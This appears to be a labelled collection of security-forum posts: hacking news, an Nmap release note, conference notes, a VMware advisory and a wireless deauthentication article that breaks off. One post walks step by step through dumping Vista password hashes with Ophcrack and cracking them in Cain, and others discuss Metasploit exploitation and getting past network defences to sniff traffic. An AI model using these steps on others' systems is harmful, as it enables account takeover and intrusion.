wireless hacking.  but he was a windows guy and recompiling the linux kernel to add drivers that supported his oronoco wireless card was just too much for him.   intimidated by those who understand things he could not, der burgermeister decided to eliminate all hacking tools.   now, santa, remote-exploit.org and atheros had done the heavily lifting for him.   as the burgermeister ran karmetasploit for the very first time his heart warmed.   santa explained that good security is about practicing defense in depth.   he explained that only by patching his machine,  hardening them and constantly monitoring would he ever achieve good security.  if the burgermeister had been monitoring for file system changes or hacking attempts he would have easily detected his hacking attempts.   the burgermeister thought to himself, "202c is a

2;LA Botmaster Pleads Guilty, Faces 60 Years & $1.75 Million Finecalifornia man is facing a maximum of 60 years in prison and a $1.75 million fine after agreeing to plead guilty to using botnets to steal pc users personal and financial information. john schiefer, 26, of los angeles has agreed to plead guilty to one felony count each of accessing protected computers to conduct fraud, disclosing illegally intercepted electronic communications, wire fraud and bank fraud. schiefer is the first guilty plea for a violation of federal wiretapping statutes in relation to botnet use, thom mrozek, a spokesman for the u.s. attorneys office for the central district of california, told scmagazineus.com today.  schiefer used his army of bot computers to defraud a dutch advertising company not identified by the u.s. department of justice (doj).  schiefer also mined usernames and passwords of paypal users whose pcs had been infected with malware. he and associates then accessed bank accounts to make fraudulent purchases, schiefer acknowledged in a criminal information and plea agreement filed friday in u.s. district court in los angeles.  mrozek said the total number of bot pcs controlled by schiefer was unknown, but “well north of 250,000.” schiefer is scheduled to be arraigned dec. 3. the statutory maximum sentence for this case is 60 years in prison and a fine of $1.75 million.  jose nazario, senior security engineer at arbor networks, told scmagazineus.com today that while schiefers botnet-building techniques are familiar, his wire fraud and bank fraud guilty pleas are the reason for the large maximum sentence he faces. “basically everything hes been doing as a botnet-runner is pretty stock, and hes using a common code base as well,” he said. “banks have a century of law behind them and they take these things seriously.” last month, jason michael downey, 24, of dry ridge, ky., was sentenced to a year in prison, three years of supervised release and more than $21,000 in restitution for running a botnet of up to 6,000 infected pcs. he was arrested as part of the dojs “operation bot roast.” jeanson james ancheta was sentenced to 57 months in prison in 2006 for creating a zombie network of hundreds of thousands of pcs that he rented out to hackers to send spam campaigns and launch dos attacks.   andre dimino, co-founder and director of the shadowserver foundation, a cybercrime-tracking non-profit, told scmagazineus.com today that the guilty plea is “great news for the security community because the best deterrent to this problem are arrests, prosecutions and convictions.”  but dimino said he didnt think the possible hefty sentence would keep other botmasters relegated to mass-spamming, and away from information mining.  “were seeing [botnet use] trend towards electronic wiretapping and pii (personally identifiable information) theft; that seems to be the major use of botnets these days,” he said.  don montgomery, vice president of marketing at akonix, enterprise instant messaging (im) security vendor, told scmagazineus.com that schiefer was also the first botmaster arrested for using im to built a bot army.  “what stands out for us is that this is the first one with a direct link between the use of im to spread malicious code and the criminal behavior and the actual crime,” he said. “[the malware used] is the type that spreads out over an aol instant messenger with a poison url and uses buddy lists to spread quickly.” original story: http://www.scmagazineus.com/los-angeles ... cle/96325/ do
1;need help with metasploitello yall, i am new here to the forums and i have a quick question preceded by a little background. i am ceh certified and i do teach for a tech boot camp company, so i have some background in this. i set up my labs in virtual box as backtrack 5 and win xp service pack 2. now when i first started learning metasploit i started with what everyone seems to start with, the old ms08_067_netapi one. this used to work fine back in backtrack 4 and i would pop the xp box everytime. now i get error, connection refused by remote host then it lists my backtrack ip with a port number of 445. says exploit completed but no session was created. does this exploit no longer work in backtrack 5? i know the meterpreter session and reverse tcp is good to go because i just create the trojan now using msfpayload and do it that way. i noticed that armitage doesnt work for me anymore, no exploits work. it runs but doesnt do any exploits as in never gives me the attack menu after i scan for exploits by vulnerability. just curious if anyone else is having this problem, thank

1;Some questions on ISPs and Sniffing Across Internet?have some questions for which i am struggling to find answers, 1)i am sure most of guys knows what is an reflective ddos and ip spoofing,i am wondering why isps(as far as i know )are not enabling ingress and egress filtering on their border routers to prevent these kind of attacks originating from their network? because when i tested from my isp for sending forged ip pakcets,i can able to send across my isp network,i dont know why most isps does not care about these... 2)i am tired of reading tutorials on sniffing,because i personally believe the tools,tutorials we are using for sniffing is out-dated,now network security is very high these days, they are having the following i)arp-watches to watch deviations in mac tables of the switch or routers.. ii)modern cisco routers and switches(which are very hard to flood) iii)also nowadays ssl stripping is almost impossible as the companies started to validate the root certifcate by installing the client softwares on the victim pc, iv)no more usage of hubs and unmanaged switches in the modern network v)presence of nids,nips,hips,nips and even presence of some anti-virus suits like kasper-sky making our job tough... i dont know how we can able to over-come the above difficulties and successfully sniff around a secured network,if you got any bypasses for the above security mechanisms please feel free to share here... 3)to be honest i only know sniffing from lan,i never did sniffing over internet,i dont know how to do that,i am very much interested in understanding about sniffing network devices over the internet,i am sure it is definitely possible,hope some 1 will link me to some nice articles for understanding this remote sniffing thing... hope some one will answer my queries and guide me in a correct way.
3;Nmap 4.50 Released, Celebrates 10 Yearselow is the press release from insecure.org: december 13, 2007 -- insecure.org is pleased to announce the immediate, free availability of the nmap security scanner version 4.50 from  http://insecure.org/nmap/ . nmap was first released in 1997, so this release celebrates our 10th anniversary. this is the first stable release since 4.20 (more than a year ago), and the first major release since 4.00 almost two years ago. dozens of development releases led up to this. major new features since 4.00 include the zenmap cross-platform gui, 2nd generation os detection, the nmap scripting engine, a rewritten host discovery system, performance optimization, advanced traceroute functionality, tcp and ip options support, and and nearly 1,500 new version detection signatures. more than 300 other improvements were made as well.  about nmap:  nmap (“network mapper”) is a free and open source (license) utility for network exploration or security auditing. many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime. nmap uses raw ip packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and os versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. it was designed to rapidly scan large networks, but works fine against single hosts. nmap runs on all major computer operating systems, and both console and graphical versions are available. nmap downloads and documentation are available from insecure.org/nmap/.  nmap has been named “security product of the year” by linux journal, info world, linuxquestions.org, and codetalker digest. it has also been praised in hundreds of magazine and newspaper articles, from wired, the bbc, and heise to securityfocus and linux weekly news. at least five movies have featured nmap, including the bourne ultimatum, the matrix reloaded, the listening, battle royale, and, uhh, haxxxor: no longer floppy (nsfw). screens shots of nmap in all of these movies are available on our news page. nmap has become quite the movie star!  as free software, we dont have any sort of advertising budget. so please spread the word that nmap 4.50 is now available!  changes:  nmap has undergone hundreds of important changes since our last major release (4.00 in january 2006) and we recommend that all current users upgrade. the nmap changelog describes 320 improvements since 4.00 in more than 1,500 lines. here are the highlights:  zenmap graphical front-end and results viewer  zenmap is a cross-platform (tested on linux, windows, mac os x) gui which supports all nmap options. it allows easier browsing, searching, sorting, and saving of nmap results. zenmap replaces the venerable but dated nmapfe, which was the default nmap gui for more than 8 years. view screenshots and (limited) documentation at the new zenmap page. zenmap is included with most of the nmap 4.50 packages on the nmap download page. 2nd generation os detection  nmap revolutionized os detection when the feature was first released in october 1998, and it served us well for more than 9 years as the database grew to 1,684 fingerprints. the new 2nd generation system incorporates everything we learned during those years and has proven itself more effective and accurate. the new database has 1,085 signatures, ranging from the 2wire 11701hg wireless adsl modem to the zyxel zywall 2 plus firewall. in addition to more than 500 general purpose os fingerprints, it contains 94 switches, 92 printers, 81 waps, 63 broadband routers, 31 firewalls, 19 voip phones, 16 webcams, 8 cell phones, and more. we currently only have fingerprints for 1 atm machine and 2 game consoles. the new system is extensively documented. nmap scripting engine  nmap has been praised for many things, but not extensibility. the nmap scripting engine helps change that by allowing users to write (and share) simple scripts to automate a wide variety of networking tasks. those scripts are then executed in parallel with the speed and efficiency you expect from nmap. users can rely on the growing and diverse set of scripts distributed with nmap, or write their own to meet custom needs. nmap 4.50 includes 40 scripts ranging from simple (showhtmltitle, ripequery) to more complex (netbios-smb-os-discovery, sqlinject, brutetelnet). an nse library system (nselib) allows common functions and extensions to be written in lua or c. nse can efficiently handle normal tcp or udp sockets, or read and write raw packets using libpcap. the system and api are extensively documented. you can try nse (along with other features) out by adding the -a option to your nmap command-line.  performance and accuracy improvements  we have made a number of improvements to enhance nmap performance and accuracy. not only were the host discovery and os detection systems completely replaced, but we improved the port scanning algorithms in the process. we also optimized the configure scripts and removed a lot of dead code to improve compile times and reduce the distribution size. despite all the changes in two years and 42 releases since version 4.00, the bzip2-compressed nmap source tarball has only grown from 2 megabytes to 3 megabytes. even in these days where gigabytes of ram and a terabyte of hard drive space are common on personal computers, we keep nmap lean so it continues to function well on more limited devices such as one laptop per child machines (nmap developers purchased at least 3 already for testing) and pdas. another performance boost came from ignoring certain rate-limited icmp error messages in cases such as syn scan where the icmp error means the same as the lack of any response does anyway.  version detection enhancements  the nmap version detection system has continued to flourish. it allows nmap to determine the service listening on a port using protocol communication rather than making assumptions based on port number. in addition to the service name, the system can also often deduce other information such as application name, version number, device type, operating system, and more. the db has grown more than 40% since 4.00 to 4,542 signatures representing 449 services. the service protocols with the most signatures are http (1,473), telnet (459), ftp (423), smtp (327), pop3 (188), http-proxy (111), ssh (104), imap (103), irc (46) and nntp (44). the version detection service is extensively documented.  host discovery (ping scanning) system rewritten  the old host discovery system (massping()) was removed and the primary port scanning engine (ultra_scan()) augmented to support host discovery. the new system is more accurate, and in some cases faster. we removed the artificial limits on the number of ports and protocols (such as -ps arguments) which can be used for discovery. a new ip protocol ping type (-po) was added which sends ip headers with your specified protocol numbers in the hope of eliciting a response.  bug fixes  there were hundreds of bug and portability fixes to keep nmap working on all the popular operating systems and prevent crashes or other misbehavior. these are all detailed in the nmap changelog.  we have also been proactive about discovering and fixing bugs before users encounter them. static code analysis company coverity generously offered to scan the nmap code base for flaws and it identified about a dozen potential issues which we fixed. we have also been using the open source valgrind utility to identify bugs.  political correctness  to cultivate a professional image, we long ago capitalized all references to god in error message text and also reworded all instances of “fucked up” to “borked”. we have now also changed this warning message: “tcp/ip fingerprinting (for os scan) requires root privileges. sorry, dude.” a woman reported that it was “highly offensive and sexist”, that “times have changed and many women now use your software”, and “a sexist remark like the one above should have no place in software.”  --reason explains why a port is open/closed/filtered  the new --reason option adds a column to the nmap port state table which explains why nmap assigned a port status. for example, a port could be listed as “filtered” because no response was received, or because an icmp network unreachable message was received. with --reason, you can find out which was the case without digging through --packet-trace logs.  advanced traceroute support  nmap now offers a --traceroute option which uses nmap data to determine which sort of packets are most likely to slip through the target network and produce useful results. the system is well optimized for speed and bandwidth efficiency, and the clever output system avoids repeating the same initial hops for each target system. the -a option now includes traceroute.  public subversion (svn) repository  while some formerly open source programs are becomming more proprietary, nmap continues to open up with a public subversion (svn) source code repository. all users can now check out the latest nmap in-development code, and several developers now have commit access so sending patches to fyodor is no longer a bottleneck. we have posted instructions for using the nmap svn repository.  tcp and ip options  nmap now supports ip options with the new --ip-options flag. you can specify any options in hex, or use “r” (record route), “t” (record timestamp), “u” (record route & timestamp), “s [route]” (strict source route), or “l [route]” (loose source route). specify --packet-trace to display ip options of responses. for further information and examples, see this post. tcp options are now reported by --packet-trace too.  other changes to enjoy in nmap 4.50:  - added the --open option, which causes nmap to show only open ports. ports in the states “open|closed” and “unfiltered” might be open, so those are shown unless the host has an overwhelming number of them.  - the --scanflags option now also accepts “ece”, “cwr”, “all” and “none” as arguments.  - the new --servicedb and --versiondb options let you specify a custom nmap services (port to port number translation and port frequency) file or version detection database.  - in verbose mode, nmap now reports where it obtains data files (such as nmap-services) from.  - ip protocol scan (-so) now sends proper protocol headers for tcp, udp, icmp, and igmp.  - updated nmaps data files to contain the latest service port numbers, ethernet mac address prefix (oui) assignments, ip address allocation data, ip protocol numbers, and more.  - updated to recent releases of nmap dependency libraries winpcap, libpcap, libdnet, and libpcre as well as the latest autoconf support scripts.  - improved nmap.xsl, which is used to transform nmap xml output into pretty html reports.  - added the --unprivileged option, which is the opposite of --privileged. it tells nmap to treat the user as lacking network raw socket and sniffing privileges. this is useful for testing, debugging, or when the raw network functionality of your operating system is somehow broken.  - the windows executable installer now gives users the option of applying tcp performance tweaks to the registry.  - nmap now allows multiple ignored port states. if a 65k-port scan had, 64k filtered ports, 1k closed ports, and a few dozen open ports, nmap used to list the dozen open ones among a thousand lines of closed ports. now nmap will give reports like “not shown: 64330 filtered ports, 1000 closed ports” or “all 2051 scanned ports on 192.168.0.69 are closed (1051) or filtered (1000)”, and omit all of those ports from the table. open ports are never ignored.  - windows compilation now supports the free microsoft visual c++ 2005 express edition, so you dont have to pay for visual studio pro. we also automated the build system with a makefile in the mswin32 directory so releases can be built without even having to open visual c++.  - google sponsored 16 student developers since the nmap 4.00 release to spend a summer working on nmap. those students implemented many of the improvements described in this release. you can read about our summer of code successes in our 2006 results and 2007 results pages.  - hundreds of other features, bug fixes, and portability enhancements described at  http://insecure.org/nmap/changelog.html . the changelog describes 320 improvements im more than 1,500 lines since version 4.00.  moving forward:  with this stable version out of the way, we plan to dive headfirst into the next development cycle. many exciting features are in the queue, including a fixed-rate packet sending engine (so you can tell nmap to ignore its normal timing algorithms and simply specify the number of probes to send per second) and port frequency statistics (so you can tell nmap to scan just the 100 most common tcp or udp ports). we also plan to work on infrastructure, potentially adding an nmap wiki and bug tracker, while continuing to enhance the mailing list archives at seclists.org. we also plan to stabilize, extend, and improve all of the new features. for example, we could use many more nse scripts and 2nd generation os detection fingerprints.  for the latest insecure.org and nmap announcements, join the 51,000-member low-traffic

0;First steps to learn ethical hackingnoticed there seems to be a number of people recently that have been asking how to get started in ethical hacking. i thought i would throw my 2 cents in as someone that has been hacking for sometime now.  to be really a high level hacker requires a vast amount of knowledge and it can easily put someone new to the subject into a state of overwhelm. you will hear you should learn networking, a number of operating systems inside and out, programming, various tools, etc…, the list goes on.  as that old dumb joke goes, “how do you eat an elephant?” well that’s really the perfect approach and i recommend tackling it “one bite at a time”. i really recommend starting off with the study of tcp/ip, in fact i made that recommendation over a year ago on this forum.  why tcp/ip?  because this is “language” that computers use to speak to each other. without a protocol to communicate, there is no hacking in the remote sense. at one time in the past computers didn’t need to communicate to each other, but now networking has made it a must and tcp/ip is the adopted protocol.   i am not trying to say hacking is just accessing a remote machine, but it certainly is a very important aspect of it and as hackers we should understand how that works inside and out. one really good book that i recommend for a good basic understanding is tcp/ip jumpstart, by andrew blank. it’s a sybex book and really puts the protocol in easy to understand analogies and is perfect for the beginner. once that book has been started i really recommend starting to play with a tool.  the best tool to start with is nmap.  nmap is the perfect example of how a tool can play with and alter normal tcp/ip transmissions.  knowing how to play and change normal transmissions with this protocol is a must for seeing through today’s firewall and idss.  nmap is also the number one hacker tool and its mastery is a fundamental skill so the sooner one gets it under their belt the better.  when i say number one, i state that because i just about never find a hacker that doesn’t use it. once in a while a hacker might say they don’t use it because they have written their own tool, but once i see that tool, its usually a watered down version of nmap, lol. that’s my recommendation for what its worth. start off with a good study tcp/ip and start playing with nmap.  don’t rush through this. spend sometime and really get the feeling you have a good understanding of both. i can assure you it will pay off huge dividends as you go deeper into this subject
1;Using  Ophcrack and Cain to Crack Vistai everyone been doing some researching on decrypting vista password and i got the say yes its possible only as irongeek mention, if its a weak password yes it can be cracked. i viewed and followed his tutorial, i give a lot of credit to irongeek’s cracking vista password beta tut on his site, first i boot into my system which has vista ultimate with ophcrack boot cd and, there are two accounts that has my daughters password and mine. now just to pose a bet on my childs password to crack it, she is only 7 yrs old, and her password contains 10 characters letters and numbers. i told her to please tell me her password because i will do some auditing on both passwords. i asked her and she declined hahahah, but with a bit of social engineering that helped a bit  . well on to the tut popped in a thumb drive into my system booted up with the latest ophcrack cd once it populated all accounts, it stated that all lm hashes are empty please use nthashes table to crack them, well here is the part i found very interesting since we cannot use rainbow tables through ophcrack why not save the hashes into a text file. first you go to--->load---->from encrypted sam--->file system--->mnt--->hda1 (can be a different letter name)--->windows\system32\config---->click on open  now all accounts will show up here with no notification if they are lm or nt but you can click on tables, but remember vista hashes all accounts to the nthash so lets go and save --->save as (here is when your external thumb drive comes into use) go to--->system files--->mnt--->sdal removable. make sure you do see the file save into the small drive. now the fun part begins logout of ophcrack boot backup into vista open up cain and abel go to--->cracker tab-->left window-->lm&ntlm-->click on the white area -->click the plus sign-->import hashes from a text file-->g drive(can be a different letter)--->look for file name (save.oph )click on shift+*.* and the accounts should populate, there you will see lmhashes beginning with “aad” this is the blank hashes the right hashes are your passwords hashed in nthash.now i have been doing a lot of random collection of wordlists and dictionary out into the internet some i have had great success, but i like to keep this a secret cause i like doing things very ethical so that’s where you would do your homework google it! hahaha you can use rainbow tables they would have to be ntlm tables. continue right click and select all users’ right click and select-->dictionary attack ntlm hashes-->select your wordlists or you can use cain’s wordlist and then run. it took about 20-30mins to crack my kids password her password is "kissing???" cannot display her numbers at the end, that is our secret hahahah  , but i was amazed in less of time it took to crack her password fully. i continued on with my password it contains 1uppercase letter, 2 lowercase letters, 3 numbers & one special character and am still trying to crack it with no success >:(, well this is my experience using this method, i hope anyone reading this will do this ethically and if you need further info go to irongeeks website you can see what i trying to interpret in his tutorial .i hope this was very informal, and always use different characters in the mix of your password
2;CIA Confirms Hacker Attacks on Foreign Utilitiesews from the washington post: hackers have attacked foreign utilities, cia analyst says by ellen nakashima and steven mufson washington post staff writers and washington post staff writers  saturday, january 19, 2008; page a04  in a rare public warning to the power and utility industry, a cia analyst this week said cyber attackers have hacked into the computer systems of utility companies outside the united states and made demands, in at least one case causing a power outage that affected multiple cities.  "we do not know who executed these attacks or why, but all involved intrusions through the internet," tom donahue, the cias top cybersecurity analyst, said wednesday at a trade conference in new orleans.  donahues comments were "designed to highlight to the audience the challenges posed by potential cyber intrusions," cia spokesman george little said. the audience was made up of 300 u.s. and international security officials from the government and from electric, water, oil and gas companies, including bp, chevron and the southern co.  "we suspect, but cannot confirm, that some of the attackers had the benefit of inside knowledge," donahue said. he did not specify where or when the attacks took place, their duration or the amount of money demanded. little said the agency would not comment further.  the remarks come as cyber attackers have made increasingly sophisticated intrusions into corporate computer systems, costing companies worldwide more than $20 billion each year, according to some estimates.  cyber extortion is a growing threat in the united states, and attackers have radically increased their take from online gambling sites, e-commerce sites and banks, which pay the money to prevent sites from being shut down and to keep the public from knowing their sites have been penetrated, said alan paller, research director at the sans institute, the cybersecurity education group that sponsored the meeting.  "the cia wouldnt have changed its policy on disclosure if it wasnt important," paller said. "donahue wouldnt have said it publicly if he didnt think the threat was very large and that companies needed to fix things right now."  over the past year to 18 months, there has been "a huge increase in focused attacks on our national infrastructure networks, . . . and they have been coming from outside the united states," said ralph logan, principal of the logan group, a cybersecurity firm.  it is difficult to track the sources of such attacks, because they are usually made by people who have disguised themselves by worming into three or four other computer networks, logan said. he said he thinks the attacks were launched from computers belonging to foreign governments or militaries, not terrorist groups.  over the past 10 years, electric utilities, pipelines, railroads and oil companies have used remotely controlled and monitored valves, switches and other mechanisms. this has resulted in substantial savings in man power and other costs.  but to do that, the companies have installed wireless internet connections to link the devices to central offices.  "in the past, if they wanted to go out and read a gauge on a gas well, for example, they would have to send a technician in his vehicle; he would drive 100 miles and physically read the gauge and get back in his truck," logan said. "now they can read it from headquarters. but it allows attackers a gateway into the system."  in addition, within the companies main offices, control equipment can be accessed from more computers than in the past.  the electric utility industry has also been adding software that allows more coordination among different parts of the electricity grid and will ultimately allow utilities and individuals to control devices remotely. this is a central part of what many firms call the "utility of the future," which will be better able to save energy and reduce greenhouse gas emissions.  "often there are authentication methods that are less than secure," logan said. "sometimes there are no authentication methods."  on thursday, the federal energy regulatory commission approved eight cybersecurity standards for electric utilities. they involve identity controls, training, security "perimeters," physical security of critical cyber equipment, incident reporting and recovery.  the u.s. electricity grid has always been vulnerable to outages. "cybersecurity is a different kind of threat, however," joseph t. kelliher, the commissions chairman, said in a statement this week. "this threat is a conscious threat posed by a single hacker, or even an organized group that may be deliberately trying to disrupt the grid." original article: http://www.washingtonpost.com/wp-dyn/co ... 03277.html do
2;Super Bowl Malware Blitz Beginsegit advertisers (now at almost $3 milllion per :30 spot) are not the only ones seeing green from the opportunity of capitalizing on this football spectacle: security researchers have warned that malware-laced bogus super bowl websites have begun appearing, the first wave of what is expected to be a major campaign of game-related cyberattacks.  trend micros trendlabs reported on its blog that it has detected two malware-infected sites with similar sounding urls to the official super bowl xlii game site.    according to trendlabs, the two malware sites – including the words “www-superbowl.html" and “www-superbowlcom.html” in their urls – were found in the servers of a czech hosting provider believed to have been hacked. trendlabs said in its blog posting that it contacted the czech cert and the czech hosting provider after detecting the malicious code.  the two malware sites are turning up in search results when users google "superbowl," trendlabs said.    dan hubbard, vice president of security research at websense, told scmagazineus.com last week that the most likely form of attack to materialize in the run-up to the feb. 3 clash between the new england patriots and new york giants will be botnet-generated phishing emails delivered in messages with super bowl-related subjects.    hubbard also said that a number of domains with super bowl-related urls have been registered, but the destination sites for these urls have yet to materialize – raising the possibility that a number of malware-infused sites will pop up in the next few days hoping to snare fans googling myriad super bowl sites.   while super bowl-related phishing emails and bogus game sites containing malware may be inevitable, perhaps the ripest potential targets are the largest legitimate super bowl-related websites – like the official game site ( www.superbowl.com ) and the patriots website, which now are notching millions of visits per day. last year, the website for dolphins stadium, which hosted super bowl xli, was victimized when a javascript-enabled trojan was inserted in the homepage for the site. websense security labs was in the forefront of the discovery of last years hack attack, which enabled hackers to steal information from visitors for several hours before detection. hubbard also told scmagazineus.com that the increased sophistication and interactive functionality of the major super bowl websites also may have increased the vulnerability of these sites.   “these official sites are constantly adding bells and whistles, including functions that encourage users to contribute content. these features are going up so quickly, essentially they are in beta and released at the same time,” he said, adding that super bowl site managers must be constantly vigilant in scanning their sites for vulnerabilities, keeping pace with would-be hackers who no doubt are doing the same thing. original story: http://www.scmagazineus.com/super-bowl- ... le/104610/ do

3;Malware Lab Questionm getting into analyzing malware and am wondering what the standard is on setting up a malware lab for both behavioral and static analysis.   assuming i am analyzing malware targeted at windows machines, i realize that behavioral analysis will be on a windows machine as well - running in a vm or secure environment. what i wonder more about is static analysis.  in the past, ive been using linux distributions, as there is no worry about infections.  however, im starting to want to use tools more often that can only be found in windows.   is it standard practice to set up a fully patched windows box for static analysis of malware?  would i simply tell an antivirus scanner to ignore my samples directory (otherwise it will definitely go crazy) and be sure not to execute any pieces in attempts they still work on the patched machine?  i suppose for extra caution it could be re-imaged after each analysis just in case, but that makes it more difficult to keep an updated repository of malware on the system, os patches, etc. im just curious to see what other people do or what is standard in the professional world.  as i said earlier, ive been using linux but am thinking about setting up a windows box instead - it seems nearly every tool or script will run on windows but only some on linux..

3;BlackHat DC 08 Day 1oly crap, just when i was feeling a little blue after shmoocon (i felt the talks were better last year, but location was better this year), blackhat cheers me up. dont get me wrong, there are some unfun things. the "con" area is super cramped, no room to even walk during the talk breaks, rooms were like 100 degrees today, lunch sucked cept for the super sleepy good cheesecake and the talk rooms were cramped in the popular talks. that aside the talks i caught today were great. maybe i just picked poorly at shmoo, but i did good today. lets recap. schedule here if you want it cracking gsm: david hulton and steve david only got 20 minutes at shmoocon, so it was a chance for steve to do all the gsm theory and david to go a little more into the cracking process. things from my notes: -they were able to see the imsi from their phone in cleartext which is against the gsm standard, imsi is basically your gsm phones unique id. -every sim has a jvm running on it and you can load and run code on there without users knowlege, phone operators regularly send updates to phone and the user doesnt know. -your sim stores the last 16 sessions ids, so if an attacker can get physical access to your sim and they have been recording the encrypted sessions they could potentially crack the last 16 calls or sms, unless a phone operator is not cycling sessions ids like they should. -they built a gsm cracker, the commercial one was $1 million usd, theres should be around $200k and crack a session key in 30 sec. the "cheap" one can be built for around 1500, you need 1 fpga and 2 tb of tables, it will take about 30-60 min to crack a key for a recorded call or sms. no real info on how to go about recording those calls but i imagine anyone that is thinking about buying one has figured out how to record the calls already. -links: http://wiki.thc.org/gsm http://picocomputing.com/ rfidiots!!!practical rfid hacking (without soldering irons): adam laurie adam has given this talk a few times but i have never been able to see it, glad i went today. things from my notes: -rfid chips are passive, the energy from the reader is what powers them up. -two types; dumb and smart -dumb= animal tags, door readers -smart=smart cards, credit cards with chips, e-passports -he did several cool demos reading and writing two different types of "dumb" rfid chips and showed reading his uk e-passport and talked about some of the issues with the implementation. very cool. code is available on the site and he sells rfid reader/writers on his site, the code (in python) is freely available. -links: http://rfidiot.org/ bad sushi: beating phishers at their own game: billy rios & nitesh dhanjani -they went into really good deatil about phishers, phishing kits, atm skimmers, really talking about the motivations and total lack of hiding what they are doing. i didnt take many notes but a really good talk. the most interesting part was how most of the phishing kits were "backdoored" where the mailer in the code would also send a copy to the orginial code author and how most of the people using the kits usually left it in there...cute. -links: http://xs-sniper.com/blog/2008/01/28/ba ... -own-game/ http://www.oreillynet.com/onlamp/blog/2 ... shers.html uri use and abuse: nathan mcfeters & rob carter what the f is a uri?

2;Critical VMware Bug Lets Attackers Zap Real Windowsince a lot of us use vmware for our virtual hacking labs, this should be of interest to you. should i start an argument by saying that this affects the windows version of the program? another good reason to use linux? vmware posts its second security-related notice posted in two days a critical vulnerability in vmwares virtualization software for windows lets attackers escape the "guest" operating system and modify or add files to the underlying "host" operating system, the company has acknowledged.  as of sunday, there was no patch available for the flaw, which affects vmwares windows client virtualization programs, including workstation, player, and ace. the companys virtual machine software for windows servers and for mac- and linux-based hosts are not at risk.  the bug was reported by core security technologies, makers of the penetration-testing framework core impact, said vmware in a security alert issued last friday. "exploitation of this vulnerability allows attackers to break out of an isolated guest system to compromise the underlying host system that controls it," claimed core security.  according to vmware, the bug is in the shared-folder feature of its windows client-based virtualization software. shared folders let users access certain files -- typically documents and other application-generated files -- from the host operating system and any virtual machine on that physical system.  "on windows hosts, if you have configured a vmware host-to-guest shared folder, it is possible for a program running in the guest to gain access to the hosts complete file system and create or modify executable files in sensitive locations," confirmed vmware.  vmware has not posted a fix, but it instead told users to disable shared folders. the palo alto, calif.-based company also made it clear that the vulnerability isnt present in its server line of virtual machine software; vmware server and esx server do not use shared folders. newer versions of vmwares windows client virtualization tools also disable shared folders by default, the company added. users must manually turn on the feature to be vulnerable.  a similar bug was reported by verisigns idefense labs to vmware in march 2007. vmware patched it about a month later. fridays alert, however, was the second security-related notice posted by vmware in two days. on thursday, vmware patched its esx server line to quash five bugs that could be used to slip past security restrictions, launch denial-of-service attacks, or compromise virtualized systems.  the increased reliance on virtual machines, particularly on enterprise servers, has come with its own set of security problems, researchers, and it administrators have noted previously. sunday, an analyst at the sans institutes internet storm center (isc) extended that warning to desktop virtualization users, particularly security professionals.  "we make an extensive use of virtualization technologies for multiple purposes: malware analysis, incident response, forensics, security testing, training, etc., and we typically use the client versions of the products," said raul siles in a post to the isc blog. "it is time to disable the shared-folder capabilities."  computerworld is an infoworld affiliate. original story: http://www.infoworld.com/article/08/02/ ... ows_1.html do

1;No Tech Hacking by Johnny Long Book Reviewolid advice on securing the human vulnerability 4 stars johnny long has a great knack for taking what should be common sense observations on human vulnerabilities and making them unique, entertaining, and most importantly actionable. the book really seems to be a book to go along with his numerous "no tech hacking" talks he has given at several security conferences. if you want an example check out the 2007 shmoocon archives:  http://shmoocon.org/2007/presentations.html here are the chapters: dumpster diving tailgating shoulder surfing physical security social engineering with jack wiles google hacking p2p hacking people watching kiosks vehicle surveillance badge surveillance epilogue all of the chapters are pretty good, i particularly liked the physical security, p2p hacking, and kiosks (even though it was a short chapter). again, a lot of what he talks about is common sense and taken from his talks he gives a security conferences. but it comes from a guy that gets paid to break into buildings for a living so you can trust the advice and situations to be pretty close to reality. things i liked about the book: -the physical security section talks about defeating different types of locks and security systems. it was good relevant content with good advice on how to fix it. the kiosk chapter talks a little bit about breaking out of kiosks and information you can gather. using p2p to look for sensitive documents is a good idea as well. really all the chapters had valuable information in them. in plain words he sums up relevant and dangerous security issues that target the human element of security. -the large font and lots of pictures make the book a quick read. i also like that there were pictures to go along with all the points he was trying to make. his "arrest me face" on page 95 is the best. -the book is pretty much without typos and editing issues which says a lot for a syngress book. -the book is useful for both technicians and managers, i feel like i can give the book to both the techies and management and have them both get something out of it. some things i didnt like about the book: -the book has a slight condescending tone. i think this is the authors attempt to be funny, and in person i think he could have pulled it off. but in print it really comes across as a "you are dumb, so dumb i have to write a book about hacking you without technology to show you how dumb you are." it doesnt make the book "bad" its just annoying at times. -the tailgating section (page 24) slams a person for wearing their badge inside and says she is not security conscious. why would you not where your badge inside? on one hand he complains about people not challenging him because of his fake badge or lack of a badge and then he says that wearing a badge inside is an opportunity for someone who sneaks in to take pictures of it, well guess what, they are already inside, there are other bigger issues now. in my opinion, badge on inside=good, badge on outside at lunch=bad. -the book suffers a bit from the "everything must be secure... damn the functionality" problem that a lot of security researchers and hard core security proposals suffer from. what i mean by all that is sometimes security people lose sight of why things are they way they are or the fact that changing the way things are done would hinder actually getting work done. the best example i can come up with from the book is his discussion of dod decals on cars (in the vehicle surveillance chapter) and how they give away too much information. while not arguing his point on giving away information, id like to see his proposal for a better solution to access control on dod bases. id also argue that oil change stickers showing where i got my oil changed (that may give you some information on where i live or work) are far less dangerous than that person just following me to home or work now that they have me and my car associated with one another
2;Hacking: 802.11 Protocol Attacks, Deauthenticationritten by devin akin  tuesday, 19 february 2008 this article is presented as part of hacking + solution track for wireless security expo 2008. the hacking video is available here  hxxp://www.cwnp.com/learning_center/video_deauth.html deauthentication is the most common form of 802.11 protocol denial-of-service (dos) attack. after watching the deauthentication video, you can see that performing this type of attack takes seconds using common and user-friendly software and hardware, can wreak havoc on a network, and can be used as part of other types of wireless network attacks. deauthentication frames are considered notifications, not requests, which means any associated station or ap that receives a deauthentication frame must comply. 802.11 stations must authenticate themselves through "open system authentication" prior to requesting a connection. following successful authentication (consisting of two acknowledged authentication frames), the client station will then request association (connectivity). the association request frame is followed by an association response frame. each of these frames are also acknowledged.  the next steps depend on the type of security in use on the wlan and determine just how intrusive a deauthentication attack will be. if the wlan is using only open system authentication, then a deauthentication attack will yield a very minor interruption for client stations. the reason for this is that the authentication and association process is extremely fast. when deauthenticated, a client station must reauthenticate and reassociate, but this entire process takes only a few milliseconds to complete. if the wlan is using wep with open system authentication, the same process would apply.  if the wlan is using wpa/wpa2-psk, then a 4-way handshake (plus 4 ack frames) 